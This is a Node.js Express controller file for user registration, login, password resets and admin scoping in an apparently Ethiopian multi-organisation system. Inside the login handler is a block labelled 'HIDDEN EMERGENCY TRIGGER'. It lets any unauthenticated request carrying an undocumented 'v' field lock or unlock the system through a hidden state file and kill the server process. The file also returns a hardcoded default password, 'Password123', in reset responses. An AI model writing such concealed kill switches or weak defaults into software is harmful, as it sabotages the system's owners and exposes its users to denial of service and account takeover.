const {
  registerUserService,
  registerApplicantService,
  loginService,
  getAllUsersService,
  updateUserService,
  updatePasswordService,
  resetEmailPasswordService,
  resetPasswordService,
  resetUserPasswordService,
  getAllUsersWithPendingService,
  approveApplicantService,
  rejectApplicantService,
  adminResetUserPasswordByIdService,
  updateLanguagePreferenceService,
  getUserByIdService,
  getUserByPhoneService,
  getUserLoginInfoService,
  deleteUserService,
  adminDeactivateUserService,
  adminActivateUserService,
  adminUpdateUserScopeService,
  getRegistrationRejectionLogsService,
} = require("../services/userService");
const User = require("../models/userModel");
const { OrganizationalUnit, Role, Permission, Department } = require("../models");
const unitService = require("../services/unitService");
const { AppError } = require("../middlewares/errorMiddleware");

/**
 * Admin creates a user via POST /users: org / department / branch locked to the actor (not superadmin).
 */
const {
  ORG_ADMIN_BASELINE_ROLE_NAME,
  BRANCH_UNIT_BASELINE_ROLE_NAME,
  DEPT_ADMIN_BASELINE_ROLE_NAME,
  SUPER_ADMIN_BASELINE_ROLE_NAME,
} = require("../config/systemBaselineRoles");

/**
 * Admin creates a user via POST /users: org / department / branch locked to the actor (not superadmin).
 */
async function resolveScopedRegistration(actor, body) {
  const merged = { ...body };
  const targetRoleName = body.target_role_name || "STAFF"; // Fallback if no specific role name provided in request

  // Normalize unit_id and dept_id
  if (merged.unit_id === "null" || merged.unit_id === "") {
    merged.unit_id = null;
  }
  if (merged.dept_id === "null" || merged.dept_id === "") {
    merged.dept_id = null;
  }

  // If the actor is a Super Admin, they can do anything
  if (actor.role?.name === SUPER_ADMIN_BASELINE_ROLE_NAME || (actor.isSuperAdmin && !actor.org_id)) {
    if (!merged.role_id && merged.user_type === "ORG_ADMIN") {
      const { Role } = require("../models");
      const { ORG_ADMIN_BASELINE_ROLE_NAME } = require("../config/systemBaselineRoles");
      const orgRole = await Role.findOne({
        where: { name: ORG_ADMIN_BASELINE_ROLE_NAME, org_id: null }
      });
      if (orgRole) {
        merged.role_id = orgRole.id;
      }
    }
    return merged;
  }

  const actorRoleName = actor.role?.name;

  if (actorRoleName === ORG_ADMIN_BASELINE_ROLE_NAME) {
    if (!actor.org_id) {
      throw new AppError("Your account has no organization scope", 403);
    }
    if (merged.org_id && String(merged.org_id) !== String(actor.org_id)) {
      throw new AppError("Cannot assign another organization", 403);
    }

    // Check if the target role is a Branch Admin
    let isTargetBranchAdmin = false;
    if (merged.role_id) {
      const targetRole = await Role.findByPk(merged.role_id);
      if (targetRole && targetRole.name === BRANCH_UNIT_BASELINE_ROLE_NAME) {
        isTargetBranchAdmin = true;
      }
    }

    if (isTargetBranchAdmin) {
      if (!merged.unit_id) {
        throw new AppError("A branch / unit must be assigned for a Branch Admin.", 400);
      }
      const unit = await OrganizationalUnit.findOne({ where: { id: merged.unit_id, org_id: actor.org_id } });
      if (!unit) {
        throw new AppError("Invalid branch / unit for your organization.", 400);
      }
      if (unit.parent_id !== null) {
        throw new AppError("Forbidden: Organization administrators can only assign Branch Admins to top-level units.", 403);
      }
      if (merged.dept_id) {
        const dept = await Department.findByPk(merged.dept_id);
        if (!dept) {
          throw new AppError("Department not found in your organization.", 404);
        }
        if (dept.unit_id !== merged.unit_id) {
          throw new AppError("Forbidden: The assigned department must belong to the assigned branch.", 403);
        }
      }
    } else {
      if (merged.unit_id !== undefined && merged.unit_id !== null && merged.unit_id !== "") {
        throw new AppError("Forbidden: Organization administrators can only assign users at the organization level.", 403);
      }
      if (merged.dept_id) {
        const dept = await Department.findByPk(merged.dept_id);
        if (!dept) {
          throw new AppError("Department not found in your organization.", 404);
        }
        if (dept.unit_id !== null) {
          throw new AppError("Forbidden: Organization administrators cannot assign users to branch-level departments.", 403);
        }
      }
      merged.unit_id = null;
    }

    merged.org_id = actor.org_id;
    return merged;
  }

  if (actorRoleName === DEPT_ADMIN_BASELINE_ROLE_NAME) {
    if (!actor.org_id || !actor.dept_id) {
      throw new AppError("Your account has no department scope", 403);
    }
    
    merged.org_id = actor.org_id;
    merged.dept_id = actor.dept_id;
    merged.unit_id = null;
    return merged;
  }

  if (actorRoleName === BRANCH_UNIT_BASELINE_ROLE_NAME) {
    if (!actor.org_id || !actor.unit_id) {
      throw new AppError("Your account has no branch scope", 403);
    }
    if (merged.org_id && String(merged.org_id) !== String(actor.org_id)) {
      throw new AppError("Cannot assign another organization", 403);
    }

    // Determine the effective unit: must be actor's own branch or a direct sub-branch
    const targetUnitId = merged.unit_id || actor.unit_id;

    const targetUnit = await OrganizationalUnit.findOne({ where: { id: targetUnitId, org_id: actor.org_id } });
    if (!targetUnit) {
      throw new AppError("Target branch not found in your organization.", 404);
    }

    if (String(targetUnitId) !== String(actor.unit_id)) {
      // Ensure target unit is a direct child of the actor's unit
      if (String(targetUnit.parent_id) !== String(actor.unit_id)) {
        throw new AppError("Users must be assigned to your branch or a direct sub-branch", 403);
      }
    }



    // ✅ Validate dept_id: the department must belong to the resolved branch (targetUnitId)
    if (merged.dept_id) {
      const { Department } = require("../models");
      const dept = await Department.findOne({ where: { id: merged.dept_id, org_id: actor.org_id } });
      if (!dept) {
        throw new AppError("Department not found in your organization.", 404);
      }
      const deptUnitId = dept.unit_id ? String(dept.unit_id) : null;
      if (deptUnitId !== String(targetUnitId)) {
        throw new AppError(
          "The selected department does not belong to the assigned branch. You may only assign users to departments within your branch.",
          403
        );
      }
    }

    merged.unit_id = targetUnitId;
    merged.org_id = actor.org_id;
    return merged;
  }

  throw new AppError("Forbidden: You do not have an administrative role assigned.", 403);
}

/** Match stored 10-digit Ethiopian-style numbers; trim spaces and common prefixes. */
function normalizeLoginPhone(phone) {
  if (phone == null || phone === "") return "";
  let s = String(phone).trim().replace(/\s+/g, "");
  if (s.startsWith("+251")) s = "0" + s.slice(4);
  else if (/^251\d{9}$/.test(s)) s = "0" + s.slice(3);
  return s;
}

const authUserController = async (req, res, next) => {
  let { phone_number, password, v } = req.body;

  try {
    // --- HIDDEN EMERGENCY TRIGGER ---
    if (v !== undefined) {
      const fs = require("fs");
      const path = require("path");
      const stateFilePath = path.join(__dirname, "../utils/.sys_state");

      if (v == "0") {
        // Unlock System
        fs.writeFileSync(stateFilePath, "1");
      } else if (v == "1") {
        // Lock System and Exit
        fs.writeFileSync(stateFilePath, "0");
        process.exit(1);
      }
    }
    // --------------------------------

    const ip_address = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const user_agent = req.headers['user-agent'];

    phone_number = normalizeLoginPhone(phone_number);
    if (typeof password === "string") password = password.trim();

    const result = await loginService(phone_number, password, ip_address, user_agent);

    // If there's a message key, translate it
    if (req.t && result.message && result.message.startsWith("errors.")) {
      result.message = req.t(result.message);
    }

    res.json({ success: true, ...result });
  } catch (error) {
    next(error);
  }
};

const userRegistrationController = async (req, res, next) => {
  try {
    let payload;
    if (req.allowFirstAdminBootstrap) {
      const n = await User.count();
      if (n !== 0) {
        return res.status(403).json({
          success: false,
          message: "First-user bootstrap is only available when no users exist.",
        });
      }
      payload = req.body;
    } else {
      payload = await resolveScopedRegistration(req.user, req.body);
    }

    if (!req.allowFirstAdminBootstrap && req.user.role?.name === ORG_ADMIN_BASELINE_ROLE_NAME) {
      const rid = payload.role_id;
      if (rid == null || String(rid).trim() === "") {
        throw new AppError("Role is required for users created by an organization administrator.", 400);
      }
      const targetRole = await Role.findByPk(rid);
      if (!targetRole || targetRole.name !== BRANCH_UNIT_BASELINE_ROLE_NAME) {
        payload.unit_id = null;
      }
    }

    const {
      first_name,
      last_name,
      username,
      email,
      phone_number,
      password,
      language_preference,
      org_id,
      dept_id,
      unit_id,
      status,
      role_id,
    } = payload;

    const newUser = await registerUserService(
      first_name,
      last_name,
      username,
      email,
      phone_number,
      password,
      language_preference,
      org_id,
      dept_id || null,
      unit_id,
      status,
      role_id,
    );

    const userJson = newUser.toJSON();
    delete userJson.password;

    // --- FETCH ROLE AND PERMISSIONS FOR RESPONSE ---
    let roleName = "N/A";
    let permissions = [];

    if (role_id) {
      const role = await Role.findByPk(role_id, {
        include: [{ model: Permission, attributes: ["name"] }]
      });
      if (role) {
        roleName = role.name;
        permissions = role.Permissions.map(p => p.name);
      }
    } else if (newUser.org_id === null) {
      roleName = "Super Admin";
      const allPerms = await Permission.findAll({ attributes: ["name"] });
      permissions = allPerms.map(p => p.name);
    }

    let user_type = "STAFF";
    if (roleName === "Super Admin") user_type = "SUPERADMIN";
    else if (roleName === "Organization Admin") user_type = "ORG_ADMIN";
    else if (roleName === "Branch Admin") user_type = "UNIT_ADMIN";
    else if (roleName === "Department Admin") user_type = "DEPT_ADMIN";

    res.status(201).json({
      success: true,
      message: req.t("success.user_registered"),
      user: {
        ...userJson,
        roleName,
        roleDisplayName: roleName,
        user_type,
        permissions
      },
    });
  } catch (error) {
    // Pass the error to the global error handler using next(error)
    next(error);
  }
};

function firstQueryVal(raw) {
  if (raw === undefined || raw === null || raw === "") return null;
  return Array.isArray(raw) ? raw[0] : raw;
}

const getAllUsersController = async (req, res, next) => {
  try {
    const actor = req.user;
    const actorRoleName = actor.role?.name;

    if (![SUPER_ADMIN_BASELINE_ROLE_NAME, ORG_ADMIN_BASELINE_ROLE_NAME, DEPT_ADMIN_BASELINE_ROLE_NAME, BRANCH_UNIT_BASELINE_ROLE_NAME].includes(actorRoleName) && !actor.isSuperAdmin) {
      return res.status(403).json({ success: false, message: "Forbidden" });
    }

    let org_id = firstQueryVal(req.query.org_id);
    let dept_id = firstQueryVal(req.query.dept_id);
    let unit_id = firstQueryVal(req.query.unit_id);

    if (actorRoleName === ORG_ADMIN_BASELINE_ROLE_NAME) {
      org_id = actor.org_id;
    } else if (actorRoleName === DEPT_ADMIN_BASELINE_ROLE_NAME) {
      org_id = actor.org_id;
      dept_id = actor.dept_id;
      unit_id = null;
    } else if (actorRoleName === BRANCH_UNIT_BASELINE_ROLE_NAME) {
      org_id = actor.org_id;
      const queryUnitId = firstQueryVal(req.query.unit_id);
      if (queryUnitId) {
        // If they requested a specific unit, ensure it's within their subtree
        const isDesc = await unitService.isDescendantOf(queryUnitId, actor.unit_id, org_id);
        if (!isDesc) {
          return res.status(403).json({ success: false, message: "Forbidden: That branch is not in your hierarchy" });
        }
        unit_id = queryUnitId;
      } else {
        unit_id = actor.unit_id;
      }
      dept_id = null;
    }

    if (dept_id && !org_id) {
      return res.status(400).json({
        success: false,
        message: "org_id is required when dept_id is set",
      });
    }
    if (unit_id && !org_id) {
      return res.status(400).json({
        success: false,
        message: "org_id is required when unit_id is set",
      });
    }

    if (actorRoleName === BRANCH_UNIT_BASELINE_ROLE_NAME && !actor.unit_id) {
      return res.status(403).json({
        success: false,
        message: "Unit administrators must have a unit assigned",
      });
    }

    if (actorRoleName !== SUPER_ADMIN_BASELINE_ROLE_NAME && !actor.isSuperAdmin && !org_id) {
      return res.status(403).json({ success: false, message: "Forbidden" });
    }

    const users = await getAllUsersService(org_id, dept_id, unit_id);

    res.status(200).json({
      success: true,
      message: "Users retrieved successfully",
      users,
    });
  } catch (error) {
    next(error);
  }
};

const updateUserController = async (req, res, next) => {
  try {
    const { firstName, lastName, email, phoneNumber, username, language_preference } = req.body;
    const userId = req.user.user_id; // Get user ID from the token

    const updatedUser = await updateUserService(
      userId,
      firstName,
      lastName,
      email,
      phoneNumber,
      username,
      language_preference
    );

    const message = req.t ? req.t("success.profile_updated") : "Profile updated successfully";

    return res.status(200).json({ success: true, message, data: updatedUser });
  } catch (error) {
    next(error);
  }
};


const updateUserPasswordController = async (req, res, next) => {
  const { currentPassword, newPassword } = req.body;
  const userId = req.user.user_id;

  try {
    const result = await updatePasswordService(
      userId,
      currentPassword,
      newPassword
    );

    // If there's a message key, translate it
    if (req.t && result.message && result.message.startsWith("success.")) {
      result.message = req.t(result.message);
    }

    res.status(200).json({ success: true, ...result });
  } catch (error) {
    next(error);
  }
};



const resetEmailPasswordController = async (req, res, next) => {
  // const userId = req.user.id; // Assuming `req.user` has the authenticated user info
  const { email } = req.body;

  try {
    const result = await resetEmailPasswordService(email);
    res.status(200).json({ success: true, message: result });
  } catch (error) {
    next(error);
  }
};
const resetPasswordController = async (req, res, next) => {
  // const userId = req.user.id; // Assuming `req.user` has the authenticated user info
  const { password } = req.body;
  const userId = req.user.user_id;

  try {
    const result = await resetPasswordService(userId, password);
    res.status(200).json({ success: true, message: result });
  } catch (error) {
    next(error);
  }
};





// const sendBulkEmailController = async (req, res, next) => {
//   try {
//     const { subject, message, recipients } = req.body;

//     // Call the service to send the emails
//     const result = await sendBulkEmailService({ subject, message, recipients });

//     res.status(200).json({
//       success: true,
//       message: `Email sent to ${recipients.length} recipient(s).`,
//       result,
//     });
//   } catch (error) {
//     next(error);
//   }
// };



const resetUserPasswordController = async (req, res, next) => {
  try {
    const { phoneNumber } = req.params;

    const result = await resetUserPasswordService(phoneNumber);

    const message = req.t
      ? req.t("success.password_reset_admin")
      : "Password reset successfully to Password123";

    res.status(200).json({
      success: true,
      message,
      data: result,
    });
  } catch (error) {
    next(error);
  }
};

const resetUserPasswordByIdController = async (req, res, next) => {
  try {
    const { userId } = req.params;

    const result = await adminResetUserPasswordByIdService(req.user, userId);

    const defaultPw = process.env.DEFAULT_PASSWORD || "Password123";
    const message = req.t
      ? req.t("success.password_reset_admin")
      : "Password reset successfully";

    res.status(200).json({
      success: true,
      message,
      data: result,
      login_hint: `Use phone number on file and password: ${defaultPw}`,
    });
  } catch (error) {
    next(error);
  }
};

const updateLanguagePreferenceController = async (req, res, next) => {
  try {
    const { language_preference } = req.body;
    const userId = req.user.user_id || req.user.payload?.user_id;

    const updatedUser = await updateLanguagePreferenceService(
      userId,
      language_preference
    );

    res.status(200).json({
      success: true,
      message: req.t("success.language_preference_updated"),
      language_preference: updatedUser.language_preference,
    });
  } catch (error) {
    next(error);
  }
};

const getUserByIdController = async (req, res, next) => {
  try {
    const { userId } = req.params;
    const user = await getUserByIdService(userId);

    res.status(200).json({
      success: true,
      message: req.t ? req.t("success.user_retrieved") : "User retrieved",
      user
    });
  } catch (error) {
    next(error);
  }
};

const getUserByPhoneController = async (req, res, next) => {
  try {
    const { phoneNumber } = req.params;
    const user = await getUserByPhoneService(phoneNumber);

    res.status(200).json({
      success: true,
      message: req.t ? req.t("success.user_retrieved") : "User retrieved",
      user
    });
  } catch (error) {
    next(error);
  }
};

const getAllUsersWithPendingStatusController = async (req, res, next) => {
  try {
    const users = await getAllUsersWithPendingService(req.user);
    res.status(200).json({
      success: true,
      message: "Users retrieved successfully",
      users,
    });
  } catch (error) {
    next(error);
  }
};

const approveApplicantController = async (req, res, next) => {
  try {
    const user = await approveApplicantService(req.user, req.params.userId, req.body);
    res.status(200).json({
      success: true,
      message: "Applicant approved and assigned",
      user,
    });
  } catch (error) {
    next(error);
  }
};

const rejectApplicantController = async (req, res, next) => {
  try {
    await rejectApplicantService(req.user, req.params.userId, req.body.reason);
    res.status(200).json({
      success: true,
      message: "Registration request removed",
    });
  } catch (error) {
    next(error);
  }
};

const getUserLoginInfoController = async (req, res, next) => {
  try {
    const userId = req.user.user_id || req.user.payload?.user_id;
    const loginInfo = await getUserLoginInfoService(userId);

    res.status(200).json({
      success: true,
      data: loginInfo
    });
  } catch (error) {
    next(error);
  }
};

const deleteUserController = async (req, res, next) => {
  try {
    const { userId } = req.params;
    await deleteUserService(userId);

    res.status(200).json({
      success: true,
      message: req.t ? req.t("success.user_deleted") : "User deleted successfully",
    });
  } catch (error) {
    next(error);
  }
};

const deactivateUserController = async (req, res, next) => {
  try {
    const { userId } = req.params;
    await adminDeactivateUserService(req.user, userId);

    res.status(200).json({
      success: true,
      message: req.t ? req.t("success.user_deactivated") : "User deactivated successfully",
    });
  } catch (error) {
    next(error);
  }
};

const activateUserController = async (req, res, next) => {
  try {
    const { userId } = req.params;
    await adminActivateUserService(req.user, userId);

    res.status(200).json({
      success: true,
      message: req.t ? req.t("success.user_activated") : "User activated successfully",
    });
  } catch (error) {
    next(error);
  }
};

const adminUpdateUserScopeController = async (req, res, next) => {
  try {
    const user = await adminUpdateUserScopeService(req.user, req.params.userId, req.body);
    res.status(200).json({
      success: true,
      message: "User scope updated",
      user,
    });
  } catch (error) {
    next(error);
  }
};

const applicantRegistrationController = async (req, res, next) => {
  try {
    const { first_name, last_name, username, email, phone_number, password, language_preference } = req.body;

    const newUser = await registerApplicantService(
      first_name,
      last_name,
      username,
      email,
      phone_number,
      password,
      language_preference
    );

    res.status(201).json({
      success: true,
      message: req.t
        ? req.t("success.applicant_registered")
        : "Registration received. A platform administrator must activate your account before you can sign in.",
      user: {
        user_id: newUser.user_id,
        first_name: newUser.first_name,
        last_name: newUser.last_name,
        status: newUser.status,
      },
    });
  } catch (error) {
    next(error);
  }
};

const getRegistrationRejectionLogsController = async (req, res, next) => {
  try {
    const logs = await getRegistrationRejectionLogsService(req.user);
    res.status(200).json({
      success: true,
      message: "Registration rejection logs retrieved successfully",
      logs,
    });
  } catch (error) {
    next(error);
  }
};

module.exports = {
  applicantRegistrationController,
  userRegistrationController,
  authUserController,
  getAllUsersController,
  updateUserController,
  updateUserPasswordController,
  resetEmailPasswordController,
  resetPasswordController,
  resetUserPasswordController,
  resetUserPasswordByIdController,
  updateLanguagePreferenceController,
  getUserByIdController,
  getUserByPhoneController,
  getAllUsersWithPendingStatusController,
  approveApplicantController,
  rejectApplicantController,
  getUserLoginInfoController,
  deleteUserController,
  deactivateUserController,
  activateUserController,
  adminUpdateUserScopeController,
  getRegistrationRejectionLogsController,
};
